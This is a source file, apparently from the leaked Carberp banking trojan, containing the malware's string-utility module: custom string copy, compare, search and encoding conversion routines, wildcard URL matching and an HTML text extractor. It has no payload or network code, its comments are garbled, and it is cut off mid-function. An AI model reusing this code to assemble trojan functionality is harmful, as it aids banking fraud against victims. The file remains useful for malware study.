/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

#include "Memory.h"
#include "GetApi.h"
#include "Strings.h"
#include "BotClasses.h"


#include "StrWildCmp.cpp"

// ���������� �����������. ����������!
int WINAPI m_lstrncmp( const char *Str1, const char *Str2, int nlen )
{
	if (!Str1 || !Str2) return -1;

	for (int i = 0; i < nlen; i++, Str1++, Str2++)
		if (*Str1 != *Str2) return 1;
	return (*Str2) ? 1 : 0;
}


DWORD WINAPI m_lstrlen(const char *Str)
{
	return STRA::Length(Str);
} 


void WINAPI m_lstrcat( char *szBuf, const char *szStr )
{
	plstrcatA(szBuf, szStr);
} 


DWORD WINAPI m_lstrcmp( const char *szStr1, const char *szStr2 )
{
	return (DWORD)plstrcmpA(szStr1, szStr2);
} 


void WINAPI m_lstrcpy( char *szBuf, const char *szStr )
{
	plstrcpyA(szBuf, szStr); 
} 


void WINAPI m_lstrlwr( char *str )
{
	if ( !str )
	{
		return;
	}

	int n = m_lstrlen( str );
	
	for(int i = 0; i < n; i++ )
	{
		if ( str[i] >= 65 && str[i] <= 90 )
		{
			str[i] += 32;
		}
	}
}


bool WINAPI m_lstrncpy( char *pString_src, const char *pString_dst, DWORD len )
{
	if ( !pString_dst || !pString_src )
	{
		return false;
	}

	if ( m_lstrlen( (char*)pString_dst ) < len )
	{
		len = m_lstrlen( (char*)pString_dst );
	}

	for ( DWORD i = 0; i < len; i++ )
	{
		pString_src[i] = pString_dst[i];
	}

	return true;
}


char * WINAPI m_strtok_s( char *String, const char *Control, char **Context )
{
    char *token;
    const char *ctl;

    if ( !String )
    {
        String = *Context;
    }

    for ( ; *String != 0 ; String++ )
    {
        for ( ctl = Control; *ctl != 0 && *ctl != *String; ctl++ );

        if ( *ctl == 0 )
        {
            break;
        }
    }
    
	token = String;

    for ( ; *String != 0 ; String++)
    {
        for ( ctl = Control; *ctl != 0 && *ctl != *String; ctl++ );

        if ( *ctl != 0 )
        {
            *String++ = 0;
            break;
        }
    }
    
	*Context = String;

    if ( token == String )
    {
        return NULL;
    }
    else
    {
        return token;
    }
}


int WINAPI m_isspace( char x )
{
	return ( x == ' ' );
}


int WINAPI  m_isdigit( char x )
{
	return ( ( x >= '0' ) && ( x <= '9' ) );
}


long WINAPI m_atol( const char *nptr )
{
	if ( !nptr )
		return 0;

	int c;              
	long total;         
	int sign;           
	
	while ( m_isspace( (int)(unsigned char)*nptr ) )
	{
		++nptr;
	}
	
	c = (int)(unsigned char)*nptr++;

	sign = c;

	if ( c == '-' || c == '+' )
	{
		c = (int)(unsigned char)*nptr++;
	}
	
	total = 0;
	
	while ( m_isdigit( c ) )
	{
		total = 10 * total + ( c - '0' );     
		c = (int)(unsigned char)*nptr++;    
	}
	
	if ( sign == '-' )
	{
		return -total;
	}
	else
	{
		return total;   
	}
}


int m_atoi( const char *nptr )
{
	return (int)m_atol(nptr);
}

char * WINAPI m_strstr( const char * _Str, const char * _SubStr )
{
	if( !_Str || !_SubStr )
		return NULL;

	int f = 1;
	int s;

	size_t sslen = m_lstrlen( (char*)_SubStr );

	for ( char* p = (char*)_Str; f;  p++ )
	{
		char* k = (char*)_SubStr;

		if ( *p == 0 )
		{
			break;
		}

		if ( *k == 0 )
		{
			break;
		}

		if ( *p == *k )
		{
			char* p1 = p;
			char* k1 = k;

			s = 0;

			for( ; true;  )
			{
				if( *p1 == *k1 )
				{
					s++;
				}

				if( s == (int)sslen )
				{
					return p;
				}

				if( *p1 != *k1 )
				{
					break;
				}

				p1++;
				k1++;
			}

		}
	}
	return NULL;
}

int WINAPI m_istrstr( const char * _Str, const char * _SubStr )
{
	// ������� ���� ��������� _SubStr � ������ _Str
	if( !_Str || !_SubStr )
		return -1;

	DWORD s;
	DWORD j = 0;

   //	size_t slen  = m_lstrlen( (char*)_Str );
	size_t sslen = m_lstrlen( (char*)_SubStr );

	// �������� ������ �� ����� ������
	char *p = (char*)_Str;
	while (*p != 0)
	{
		char* k = (char*)_SubStr;

		// ���������� ������ �������
		if ( *p == *k )
		{
			char* p1 = p;
			char* k1 = k;

			s = 0;
            // ���������� ���������� ����������
			while(*p1 != 0 && *k1 != 0)
			{
				if (*p1 == *k1)
					s++;
				else
					break;

				if (s == (DWORD)sslen)
					return j;

				p1++;
				k1++;
			}
		}

		// ������� ���������
		p++;
		j++;
	}
	return -1;
}

//char* WINAPI ToAnsiEx( LPCWSTR String, DWORD dwSize )
//{
//	if ( !String) return NULL;
//
//	int l = (int)pWideCharToMultiByte ( CP_ACP, 0, String, dwSize, 0, 0, NULL, NULL);
//	char *r = (char*)MemAlloc( l + 1 );
//
//	pWideCharToMultiByte(1251, 0, String, dwSize, r, l, NULL, NULL );
//
//	return r;
//}
//
//char* WINAPI ToAnsi(LPCWSTR String)
//{
//	if ( !String) return NULL;
//
//	int l = (int)pWideCharToMultiByte ( CP_ACP, 0, String, -1, 0, 0, NULL, NULL);
//	char *r = (char*)MemAlloc( l + 1 );
//
//	pWideCharToMultiByte(1251, 0, String, -1, r, l, NULL, NULL);
//
//	return r;
//}


WCHAR *AnsiToUnicode( char *AnsiString, DWORD dwStrLen )
{
	wchar_t* res = 0;
	// ���� �� ����������� ��������������
	if( dwStrLen == 0 ) dwStrLen = -1;
	int resLen = (int)pMultiByteToWideChar( CP_ACP, 0, AnsiString, dwStrLen, 0, 0);
	if( resLen == 0 ) return 0;
 	// �������� ������
	res = (wchar_t*)MemAlloc(resLen);
 	if( res == 0 ) return 0;
	// ��������������
	if( !pMultiByteToWideChar( CP_ACP, 0, AnsiString, -1, res, resLen ) )
	{
		MemFree(res);
		res = 0;
	}
 	return res;
}

wchar_t* UTF8ToUnicode( const char* utf8String )
{
	wchar_t* res = 0;
	// ���� �� ����������� ��������������
	int resLen = (int)pMultiByteToWideChar( CP_UTF8, 0, utf8String, -1, 0, 0);
	if( resLen == 0 ) return 0;
 	// �������� ������
	res = (wchar_t*)WSTR::Alloc(resLen);
 	if( res == 0 ) return 0;
	// ��������������
	if( !pMultiByteToWideChar( CP_UTF8, 0, utf8String, -1, res, resLen ) )
	{
		WSTR::Free(res);
		res = 0;
	}
 	return res;
}

char* UTF8ToAnsi( const char* utf8String )
{
	//������� ��������������� utf8 � unicode
	wchar_t* unicodeString = UTF8ToUnicode(utf8String);
	if( unicodeString == 0 ) return 0;
	char* res = 0;  
	// ���� �� ����������� ��������������
	int resLen = (int)pWideCharToMultiByte( 1251, 0, unicodeString, -1, 0, 0, 0, 0 );
	if( resLen == 0 ) return 0;
	// �������� ������
	res = STR::Alloc(resLen);
 	if( !res ) return 0;
	// ��������������
	if( !pWideCharToMultiByte( 1251, 0, unicodeString, -1, res, resLen, 0, 0))
	{
		STR::Free(res);
		res = 0;
	}
	return res;
}


DWORD WINAPI m_wcslen( const wchar_t *String )
{
	if ( !String )
	{
		return 0;
	}

	wchar_t* p = (wchar_t *)String;

	for( ; *p != 0; )
	{
		p++;
	}

	return p - String;
}


wchar_t *m_wcsncpy( wchar_t *dest, wchar_t *src, unsigned long n )
{
	if ( !dest || !src )
	{
		return NULL;
	}

	for ( ULONG i = 0; i < n; i++ ) 
    {
	   dest[i] = src[i];
    }

    return dest;
}

bool m_wcsncmp( WCHAR *s1, WCHAR *s2, size_t iMaxLen )
{
	if ( !s1 || !s2 )
	{
		return false;
	}

	for ( size_t i = 0; i < iMaxLen; i++ )
	{
		if ( !s1[i] || !s2[i] )
		{
			return true;
		}

		if ( s1[i] != s2[i] )
		{
			return true;
		}
	}

	return false;
}

wchar_t *m_wcscpy( wchar_t *dest, int c_dest, wchar_t *src )
{
	if( src == 0 )
	{
		if( dest && c_dest > 0 ) dest[0] = 0;
	}
	else
		if( dest )
		{
			int i = 0;
			while( i < c_dest - 1 && src[i] )
			{
				dest[i] = src[i];
				i++;
			}
			dest[i] = 0;
		}
	return dest;
}

wchar_t *m_wcslwr( wchar_t *Str )
{
	if ( !Str )
	{
		return NULL;
	}

    wchar_t *Pos = Str;

    for ( ; Str <= ( Pos + m_wcslen( Pos ) ); Str++ )
    {		
        if ( ( *Str >= 'A' ) && ( *Str <= 'Z' ) ) 
		{
			*Str = *Str + ('a'-'A');
		}
    }

    return Pos;
}

const wchar_t * WINAPI m_wcsstr( const wchar_t * _Str, const wchar_t * _SubStr )
{
	if( !_Str || !_SubStr )
		return NULL;

	int f = 1;
	int s;

	size_t sslen = m_wcslen(_SubStr);

	for ( const wchar_t* p = (const wchar_t*)_Str; f;  p++ )
	{
		const wchar_t* k = (const wchar_t*)_SubStr;

		if ( *p == 0 )
		{
			break;
		}

		if ( *k == 0 )
		{
			break;
		}

		if ( *p == *k )
		{
			const wchar_t* p1 = p;
			const wchar_t* k1 = k;

			s = 0;

			for( ; true;  )
			{
				if( *p1 == *k1 )
				{
					s++;
				}

				if( s == (int)sslen )
				{
					return p;
				}

				if( *p1 != *k1 )
				{
					break;
				}

				p1++;
				k1++;
			}

		}
	}

	return NULL;
}

char* trimall( char* s, char c )
{
	int len = m_lstrlen(s);
	char* p1 = s;
	while( *p1 == c && *p1 != 0 ) p1++;
	char* p2 = s + len - 1;
	while( *p2 == c && p2 > p1 ) p2--;
	len = p2 - p1 + 1;
	m_memcpy( s, p1, len );
	s[len] = 0;
	return s;
}



bool CompareUrl(const char *MaskUrl, const char *Url )
{
	DWORD dwStart = 0;
	DWORD dwEnd	  = 0;
	DWORD dwLen	  = 0;

	if (WildCmp( Url, MaskUrl, &dwStart, &dwEnd, &dwLen ) )
	{
		return true;
	}

	return false;
}

char* SafeCopyStr( char* dst, int szDst, const char* src )
{
	if( dst == 0 || szDst <= 0 ) return 0;
	if( src == 0 ) 
	{
		dst[0] = 0;
		return dst;
	}
	int len = m_lstrlen(src);
	if( len > szDst - 1 ) len = szDst - 1;
	m_memcpy( dst, src, len );
	dst[len] = 0;
	return dst;
}

//----------------------------------------------------------------------------
PCHAR GetTextBetween(PCHAR &Buffer, PCHAR Before, PCHAR After )
{
    // ����� ���������� ����� HTML ���� ����� ������� Before � After
	if (STR::IsEmpty(Before) || STR::IsEmpty(After))
		return NULL;

	DWORD Start = 0;
	DWORD End   = 0;
	DWORD Len   = 0;

	if (WildCmp(Buffer, Before, &Start, &End, &Len ))
	{
		PCHAR StartPtr = Buffer + End;
		if (WildCmp(StartPtr, After, &Start, &End, &Len ) )
		{
			PCHAR EndPtr = StartPtr + Start;
			// ������� ��������� ������ �� ������� �� ��������� �������
			Buffer = EndPtr;

			DWORD Size = EndPtr - StartPtr;
			if (Size > 0)
				return STR::New(StartPtr, Size);
		}
	}
	return NULL;
}

//-----------------------------------------------------------------------------

namespace STRHEAD
{
	#pragma pack(push, 1)
	typedef struct THead
	{
		DWORD Signature;
		DWORD BufSize;
		DWORD Length;
	} *PHead;
	#pragma pack(pop)

	const DWORD HeadSize = sizeof(THead);
	#define StrSignature 0x54534D53 /* "SMST" */

	LPBYTE MakeHead(LPBYTE Buf, DWORD BufSize, DWORD Length, BYTE CharSize = 1)
	{
		// ���������������� ��������� ������
		LPBYTE Res = Buf + HeadSize;
		PHead H = (PHead)Buf;

		H->Signature = StrSignature;
		H->BufSize = BufSize;
		H->Length = Length;

		m_memset((Res + Length*CharSize), 0, CharSize);
		return Res;
	}

	#define StrHead(Str) ( (PHead)((LPBYTE)Str - HeadSize))

	//------------------------------------------------------------------------
	bool CheckSignature(LPVOID Str)
	{
		if (Str == NULL) return false;
		return StrHead(Str)->Signature == StrSignature;
    }
	//------------------------------------------------------------------------
	#define SetBufferSize(Str, Value) (StrHead(Str)->BufSize = Value)

	DWORD inline GetBufferSize(PCHAR Str)
	{
		return StrHead(Str)->BufSize;
	}

	DWORD inline GetLength(PCHAR Str)
	{
    	return StrHead(Str)->Length;
	}

	void inline SetLength(PCHAR Str,DWORD Length)
	{
		StrHead(Str)->Length = Length;
		*(Str + Length) = 0;
    }
	//------------------------------------------------------------------------

}

//------------------------------------------------------------------------------

PCHAR STR::Alloc(DWORD StrLen)
{
	// �������� � ������ ���� ��� ������ �������� StrLen. ���� ������ �����
	// ����� ������ StrLen + 1 (���� ������ ����������)

	if (StrLen == 0) return NULL;

	PCHAR Str = (PCHAR)HEAP::Alloc(StrLen + STRHEAD::HeadSize + 1);
	if (Str == NULL) return NULL;

	return (PCHAR)STRHEAD::MakeHead((LPBYTE)Str, StrLen, StrLen);
}

//------------------------------------------------------------------------------

DWORD StrCalcLength(const char* Buf)
{
	return STRA::Length(Buf);
}

DWORD StrCalcLengthW(const wchar_t* Buf)
{
	return STRW::Length(Buf);
}

//------------------------------------------------------------------------------

PCHAR STR::New(PCHAR Source, DWORD Len)
{
	// ������� ������ ������, ����� Source.
	// Len - ���������� ���������� ��������
	//       ���� ����� 0, �� ����� ����������� ��� ������

	if (Source == NULL) return NULL;

	if (Len == 0) Len = StrCalcLength(Source);
	if (Len == 0) return NULL;

	PCHAR Str = STR::Alloc(Len);
	if (Str != NULL)
		m_memcpy(Str, Source, Len);

	return Str;
}
//------------------------------------------------------------------------------

void STR::Free(PCHAR Str)
{
    // ���������� ������.
	// �����!!! ������ ������ ���� ������� � ������� ������� STR::New
    if (STRHEAD::CheckSignature(Str))
		HEAP::Free(Str - STRHEAD::HeadSize);
}

void STR::Free2(PCHAR &Str)
{
	// ���������� ������ � �������� ����������
	STR::Free(Str);
	Str = NULL;
}
//------------------------------------------------------------------------------


DWORD STR::Length(PCHAR Str)
{
	// ������� ���������� ����� ������.
	// ���� ������ ����������� � ������� ������� STR::New �� ������
	// ���������� �� ��������� ������ � ��������� ������ ������ �������������.

	if (Str == NULL)
		return 0;

	if (STRHEAD::CheckSignature(Str))
		return STRHEAD::GetLength(Str);
	else
		return StrCalcLength(Str);

}
//------------------------------------------------------------------------------

void STR::UpdateLength(PCHAR Str, DWORD RealLength)
{
	// ��������� �������� ����� ������ � � ����������.
	// !!!!������ ��� ����� ��������� ����� STR::Alloc (STR::New)
	// ���� �������� RealLength �� ������� �� ����� �����
	// ������������� �� �������� �������
	if (!STRHEAD::CheckSignature(Str)) return;
	if (RealLength == 0)
		RealLength = StrCalcLength(Str);
    STRHEAD::SetLength(Str, RealLength);
}

//------------------------------------------------------------------------------

void STR::Delete(PCHAR Str, DWORD Position, DWORD Count, DWORD StrLength)
{
	// ������� Count �������� � ������� Position ������ Str
	if (STR::IsEmpty(Str) || Count == 0)
		return;

	DWORD Len = StrLength;
	if (Len == 0)
		Len = StrCalcLength(Str);
	if (Position > Len) return;
	if (Count > Len - Position)
	{
		Count = Len - Position;
		if (Count == 0) return;
	}

	PCHAR Ptr = Str + Position;
	PCHAR FromPTR = Ptr + Count;
	m_memcpy(Ptr, FromPTR, Len - (Position + Count));
	Ptr = Str + (Len - Count);
	*Ptr = 0;
}
//------------------------------------------------------------------------------

PCHAR STR::Replace(PCHAR Str, PCHAR SrcStr, PCHAR DstStr, DWORD StrLen)
{
	//  ������� �������� � ������ Str ������ SrcStr ��
	//  ������ DstStr.
	//  � ������ ������ ������� ���������� ����� ������

	if (STR::IsEmpty(Str) || STR::IsEmpty(SrcStr)) return NULL;

	int P = Pos(Str, SrcStr, StrLen);
	if (P < 0) return NULL;

	DWORD SrcLen = StrCalcLength(SrcStr);
	DWORD DstLen = StrCalcLength(DstStr);
	if (StrLen == 0)
		StrLen = StrCalcLength(Str);

	DWORD NewLen = StrLen + (DstLen - SrcLen);

	// ������ ����� ������
	PCHAR Result = STR::Alloc(NewLen);
	if (Result == NULL) return NULL;

	Copy(Str, Result, 0, P);
	Copy(DstStr, Result + P, 0, DstLen);
	Copy(Str + P + SrcLen, Result + P + DstLen, 0, StrLen - (P + SrcLen));

	return Result;
}
//------------------------------------------------------------------------------

void StrSetLength(PCHAR &Str, DWORD NewLength)
{
	// �������� ������ ������ ������
	// �����!!! ������� �������� �� �������� ������� ������� �������� STR::New

	// ��� ��������������� ����� ������, �� �������� ����� ������ � ������
	// �������� � ��������� � �� ������.

	if (!STRHEAD::CheckSignature(Str) || STRHEAD::GetBufferSize(Str) == NewLength)
		return;

	PCHAR New = STR::Alloc(NewLength);
	DWORD Size = STRHEAD::GetLength(Str);
	if (NewLength < Size)
		Size = NewLength;
	m_memcpy(New, Str, Size);
	STRHEAD::SetLength(New, Size);
	STR::Free(Str);
	Str = New;
}
//------------------------------------------------------------------------------

bool STR::IsEmpty( const PCHAR Str)
{
	// ������� ���������� ������ ���� �� ����� ������� ��������� ����
	// ������ ������
	return (Str == NULL || *Str == 0);
}
//------------------------------------------------------------------------------


void __LongToString(DWORD num, char* Str, int &n)
{
	// ������ ����������� ����� � ������

	// ����������� ��������� ��������
	// ���� n �� ����� ���� ������ ��� ������ ���������
	// � ������� � ����� ��� ��������
	if (!n)
	{
		if (!num)
			n = 1;
		else
			for (int j = 1; num/j !=0; j *= 10) n++;
    }

    // ���� ���� ������� �� ��� ������ ���������� ��������
	if (!Str) return;

	// ���������������
	int i = 1;
	int d = 0;

	do
	{
		d = num % 10;
		num /= 10;
		Str[n-i]=(char)(d+48);
		i++;
	}
	while(num != 0);
}



PCHAR StrLongToString(DWORD num)
{
	int n = 0;

	STRA::LongToString(num, NULL, n);
	PCHAR Str = STR::Alloc(n);
	STRA::LongToString(num, Str, n);

    return Str;
}


string LongToStr(DWORD num)
{
	return string().LongToStr(num);
}


void StrConcat(PCHAR &Str1, PCHAR Str2)
{
	// ���������� ��� ������
	DWORD Str2Len = StrCalcLength(Str2);
	if (!STRHEAD::CheckSignature(Str1) || Str2Len == 0)
		return;
	DWORD Str1Len = StrCalcLength(Str1);

	DWORD NewLength = Str1Len + Str2Len;
    if (STRHEAD::GetBufferSize(Str1) < NewLength)
		StrSetLength(Str1, NewLength);

	PCHAR Tmp = Str1 + Str1Len;
	m_memcpy(Tmp, Str2, Str2Len);
	STRHEAD::SetLength(Str1, NewLength);
}

//------------------------------------------------------------------------------
void StrConcatArguments(PCHAR &OutStr, DWORD Count, PCHAR *First)
{
	//  ������� ���������� ��� � ����� ������.

	const DWORD MaxCount = 50;

    if (Count >= MaxCount) return;

	DWORD Lens[MaxCount];
	PCHAR *Current = First;
	DWORD FullLen = StrCalcLength(OutStr);
	Lens[0] = FullLen;

	// ����������� ����� ����� ������
	for (DWORD i = 1; i <= Count; i++)
	{
		DWORD Len = StrCalcLength(*Current);
		Lens[i] = Len;
		FullLen += Len;
		Current++;
	}

	// ����������� ������ ������� �����
	if (FullLen == 0) return;

	// ������ ������ ������
	if (OutStr != NULL)
		StrSetLength(OutStr, FullLen);
	else
        OutStr = STR::Alloc(FullLen);

	// �������� ������
	Current = First;
	PCHAR Tmp = OutStr + Lens[0];
	for (DWORD i = 1; i <= Count; i++)
	{
	    m_memcpy(Tmp, *Current, Lens[i]);
        Tmp += Lens[i];
    	Current++;
	}
}

//------------------------------------------------------------------------------

PCHAR STR::New(DWORD Count, PCHAR Str...)
{
	// ������� ������ ������ ��������� ��������� �����
	PCHAR Result = NULL;
	PCHAR *First = &Str;

	StrConcatArguments(Result, Count, First);

	return Result;
}

//------------------------------------------------------------------------------

void STR::Copy(PCHAR Source, PCHAR Destination, DWORD Position, DWORD Count)
{
	// �������� � ������� Position ������ Source Count �������� �
	// ������ Destination
	if (Source == NULL || Destination == NULL)
		return;
	m_memcpy(Destination, Source + Position, Count);
}
//------------------------------------------------------------------------------

void StrConcat(PCHAR &Str1, DWORD Count, PCHAR Str2...)
{
	//  ������� ���������� ��� � ����� ������.
	//  ���� ������ ������ ������ Str1 ������ ������������,
	//  �� ������ Str1 ����� ��������������
	if (Str2 == NULL)
		return;
	if ((Str1 != NULL) && !STRHEAD::CheckSignature(Str1))
    	return;

	PCHAR *Args = &Str2;
	StrConcatArguments(Str1, Count, Args);
}
//------------------------------------------------------------------------------
bool StrCopy(PCHAR Dest, PCHAR Source, bool UpdateLen)
{
	// ������� �������� ������ Source � ������ Dest
	// ���� UpdateLen ������������ ������ ���� Dest ������� ���������
	// StrAlloc, STR::New
	// ���������� ������ ���� ���������� ����-�� ���� ����

	if (Dest == NULL || Source == NULL)
		return false;

	DWORD Len = StrCalcLength(Source);
	m_memcpy(Dest, Source, Len);
	if (UpdateLen)
		STRHEAD::SetLength(Dest, Len);
	else
		*(Dest + Len) = 0;

 	return Len > 0;
}

//------------------------------------------------------------------------------

int StrCompare(const char* Str1, const char* Str2)
{
    // �������� ��� ������
	return STRA::Compare(Str1, Str2);
}

//------------------------------------------------------------------------------
PCHAR STR::Scan(const char* Str, char C)
{
	// ������� ���������� ��������� �� ������ �;
	return AnsiStr::Scan(Str, C);
}
//------------------------------------------------------------------------------

PCHAR STR::ScanEnd(PCHAR Str, char C)
{
	// ������� ���������� ��������� �� ��������� ������ �
	if (Str == NULL)
		return NULL;

	PCHAR Res = NULL;

	for (PCHAR Tmp = Str; *Tmp != 0; Tmp++)
		if (*Tmp == C) Res = Tmp;

	return Res;
}
//------------------------------------------------------------------------------

PCHAR STR::End(PCHAR Str)
{
	return AnsiStr::End(Str);
}
//------------------------------------------------------------------------------

inline bool IsStrEnd(PCHAR Str, DWORD Len, DWORD Pos)
{
	if (Len != 0)
		return Pos >= Len;
	else
        return *Str == 0;
}


int STR::Pos(const char* Str,  const char*  SubStr, DWORD StrLen, bool CaseSensetive)
{
	// ������� ���� ��������� _SubStr � ������ _Str
	if( !Str || !SubStr )
		return -1;

	DWORD s;
	DWORD j = 0;

   //	DWORD slen  = StrCalcLength(Str);
	DWORD sslen = StrCalcLength(SubStr);
	DWORD Pos = 0;
	DWORD Pos1 = 0;
	// �������� ������ �� ����� ������
	char* p = (char*)Str;

	while (!IsStrEnd(p, StrLen, Pos))
	{
		const char* k = SubStr;


		char PC = *p;
		char KC = *k;

		if (!CaseSensetive)
		{
			LowerChar(PC);
			LowerChar(KC);
		}

		// ���������� ������ �������
		if ( PC == KC )
		{
			char* p1 = p;
			const char* k1 = k;
			Pos1 = Pos;
			s = 0;
			// ���������� ���������� ����������
			while(!IsStrEnd(p1, StrLen, Pos1) && *k1 != 0)
			{

				char C1 = *p1;
				char C2 = *k1;

				if (!CaseSensetive)
				{
					LowerChar(C1);
					LowerChar(C2);
				}


				if (C1 == C2)
					s++;
				else
					break;

				if (s == (DWORD)sslen)
					return j;

				p1++;
				k1++;
				Pos1++;
			}
		}

		// ������� ���������
		Pos++;
		p++;
		j++;
	}
	return -1;
}
//------------------------------------------------------------------------------

PCHAR STR::GetLeftStr(PCHAR Str, PCHAR SubStr, bool IncludeSubStr)
{
	// �������� ������ �����
	int Pos = STR::Pos(Str, SubStr);
	if (Pos < 0)
		return NULL;
	if (IncludeSubStr)
		Pos += StrCalcLength(SubStr);
	return STR::New(Str, Pos);
}
//------------------------------------------------------------------------------

PCHAR STR::GetRightStr(PCHAR Str, PCHAR SubStr, bool IncludeSubStr)
{
	// �������� ������ ������
	int Pos = STR::Pos(Str, SubStr);
	if (Pos < 0)
		return NULL;

	if (!IncludeSubStr)
		Pos += StrCalcLength(SubStr);

	PCHAR Tmp = Str + Pos;

	if (*Tmp == 0)
		return NULL;
	return STR::New(Tmp);
}
//------------------------------------------------------------------------------

int StrToInt(PCHAR Str)
{
	return (int)m_atol(Str);
}
//----------------------------------------------------------------------------

void StrLowerCase(PCHAR Str)
{
	// ������� �������� ������ � ������� ��������
	if (Str == NULL)
		return;

	PCHAR Pos = Str;

	while (*Pos != 0)
	{
        if ((*Pos >= 'A')  &&  (*Pos <= 'Z'))
			*Pos = *Pos + ('a'-'A');
		Pos++;
    }
}


//------------------------------------------------------------------------------

int StrIndexOf(PCHAR Str, bool CaseSensetive, DWORD Count, PCHAR Cmp...)
{
	// ������� ���� ������� ������ � ������� ����� �mo
	if (Str == NULL || Count == 0 || Cmp == NULL)
		return -1;
	PCHAR *Cur = &Cmp;
	for (DWORD i = 0; i < Count; i++)
	{
		if (StrSame(Str, *Cur, CaseSensetive))
			return i;
        Cur++;
	}

	return -1;
}
//----------------------------------------------------------------------------


bool StrSame(PCHAR Str, PCHAR ToSame, bool CaseSensetive, DWORD StrEndPosition)
{
	// ������� ���������� ������ Str �� ������� ToSame.
	// CaseSensetive ���������� ���������������� � ��������
	// ���� StrEndPosrition �� ����� ����, �� ���������
	// �������������� StrEndPosrition ���������

	if (Str == NULL || ToSame == NULL)
		return false;

    DWORD Pos = 1;
	PCHAR S1 = Str;
	PCHAR S2 = ToSame;

	char C1;
	char C2;

	while (*S1 != 0 && S2 != 0)
	{
		C1 = *S1;
		C2 = *S2;

		if (!CaseSensetive)
		{
			LowerChar(C1);
			LowerChar(C2);
		}

		if (C1 != C2) return false;

		S1++;
		S2++;
		if (StrEndPosition != 0 && Pos >= StrEndPosition)
			return *S2 == 0;
		Pos++;
	}
    return *S1 == 0 && *S2 == 0;
}
//----------------------------------------------------------------------------

PCHAR STR::IgnoreSpaces( const PCHAR Str)
{
	// ������� ���������� �������. ������� �� �������� ������, ��� ����
	// ���������� ��������� �� ������ ������, ���� �� ����� ������
	PCHAR S = (PCHAR) Str;
	while ((*S != 0) && (*S == ' ' || *S == 9)) S++;
	return S;
}
//----------------------------------------------------------------------------

PCHAR STR::Format(PCHAR Str, va_list Arguments)
{
	if (STR::IsEmpty(Str)) return NULL;
	PCHAR FullLine = STR::Alloc(StrCalcLength(Str) + 4096);

//	va_list Arguments;
//	va_start(Arguments, Str);
	pwvsprintfA(FullLine, Str, Arguments);
//	va_end(Arguments);
	PCHAR Res = STR::New(FullLine);
	STR::Free(FullLine);
	return Res;
}
//----------------------------------------------------------------------------

PCHAR STR::GetLine(PCHAR Str, DWORD StrSize)
{
	// ������� ���������� ������� ����� � ������.
	// ����� �������������� ��������� 10, 13 ���� ������ ������
	// ����� ������ �������������� ������� �������� ���� �������� StrSize
	if (Str == NULL)
		return NULL;

	DWORD Size;
	PCHAR Tmp = Str;

	for (Size = 0; !IsStrEnd(Tmp, StrSize, Size) && *Tmp != 10 && *Tmp != 13; Size++, Tmp++);


	if (Size != 0)
		return STR::New(Str, Size);
	else
		return NULL;
}
//----------------------------------------------------------------------------

PCHAR STR::GotoNextLine(PCHAR Str, DWORD StrSize)
{
	// ������� ���������� ��������� �� ������ ������ ��������� ����� � ������
	// ���� �� ����� ������
	if (Str == NULL)
		return NULL;
	DWORD Pos;
	PCHAR Tmp = Str;

	for (Pos = 0; !IsStrEnd(Tmp, StrSize, Pos) && *Tmp != 10 && *Tmp != 13; Pos++, Tmp++);

	for (; !IsStrEnd(Tmp, StrSize, Pos) && (*Tmp == 10 || *Tmp == 13); Pos++, Tmp++);

	return Tmp;
}
//----------------------------------------------------------------------------

DWORD STR::HexToDWORD(PCHAR Str)
{
	if (STR::IsEmpty(Str))
		return 0;

	DWORD v = 0;
	if(Str[0] == '0' && Str[1] == 'x') Str += 2;
	for(;;)
	{
		char c = *Str;
		if(c >= '0' && c <= '9')
		{
		  v *= 16;
		  v += c - '0';
		}
		else
		if(c >= 'A' && c <= 'F')
		{
		  v *= 16;
		  v += c - 'A' + 0xA;
		}
		else if(c >= 'a' && c <= 'f')\
		{
		  v *= 16;
		  v += c - 'a' + 0xA;
		}
		else break;
		Str++;
	}
	return v;
}

DWORD STR::ToDWORD( const char* s )
{
	DWORD d = 0;
	if( !STR::IsEmpty( (PCHAR)s ) )
	{
		s = STR::IgnoreSpaces( (PCHAR)s );
		for(; *s != 0 && m_isdigit(*s); s++ )
		{
			d *= 10;
			d += *s - '0';
		}
	}
	return d;
}

//------------------------------------------------------------------------------
DWORD STR::GetHash(PCHAR Str, DWORD Len, bool LowerCase)
{
    return STRA::Hash(Str, Len, LowerCase);
}

/*
{
	// ������� ����������� ��� ������
	// Str - �������� ������
	// Len - ����� ������, ���� ����� 0, �� ������������� �� ��������� ����
	// LowerCase - ��������� ������� � ������ ������� ����� ��������� ����

	if (Str == NULL) return (DWORD)-1; // �������� �����

	DWORD Hash = 0;

	for (DWORD i = 0; *Str != 0 && (Len == 0 || i < Len); Str++, i++)
	{
		char Ch = *Str;
		if (LowerCase) LowerChar(Ch);
		Hash = (( Hash << 7 ) & (DWORD)( -1 ) ) | ( Hash >> ( 32 - 7 ));
		Hash = Hash ^ Ch;
	}

	return Hash;
}
*/
//------------------------------------------------------------------------------}

DWORD STR::CalcDoubleZeroStrLength(PCHAR Str)
{
	// ������� ����������� ����� ������ ��������� �� ���������� �����
	// ��������� ���� �� ����� ������� �������� � ����� ������� �����
	// ������� ������� ������
	// ��������: str0str0str00

	if (IsEmpty(Str))
		return 0;

	PCHAR S = Str;
	while (*S != 0)
	{
		S = End(S); // ��������� � ����� ������� ������
		S++;        // ���������� ������� ������
	}
	S++; // ���������� ����������� ����

    return (S - Str);
}
//------------------------------------------------------------------------------}


void STR::AnsiLowerCase(PCHAR Str)
{
	// ������� �������� ������� � ������ �������. ������� �� �������������
	// � ��������� ��������
	if (STR::IsEmpty(Str))
		return;

    DWORD Len = StrCalcLength(Str);
	pCharLowerBuffA(Str, Len);
}
//------------------------------------------------------------------------------}

bool STR::IsLinuxStr(PCHAR S)
{
	// ������� ���������� ������ ���� ������ �������� �������� �
	// ����� ������ \n

	if (STR::IsEmpty(S))
    	return false;

	BYTE Result = true;

	// ���������� ������ � ������� ������� \r
    BYTE Count = 0;
	for (; *S != 0; S++)
	{

		if (*S == '\n')
		{
			// ������������ ���������� ��������� ������� \n
			// 3 ��������� ������� ����������� ��� ���������
			Count++;
			if (Count >= 3)
				break;
		}
		else
		if (*S == '\r')
		{
			Result = false;
			break;
		}
	}

	return Result && Count > 0;
}
//------------------------------------------------------------------------------}


PCHAR STR::ConvertToLinuxFormat(PCHAR S)
{
	// ������� �������� ������ � ������ ������� - ������� �����
	// ������ ������ \n
	if (STR::IsEmpty(S))
		return NULL;

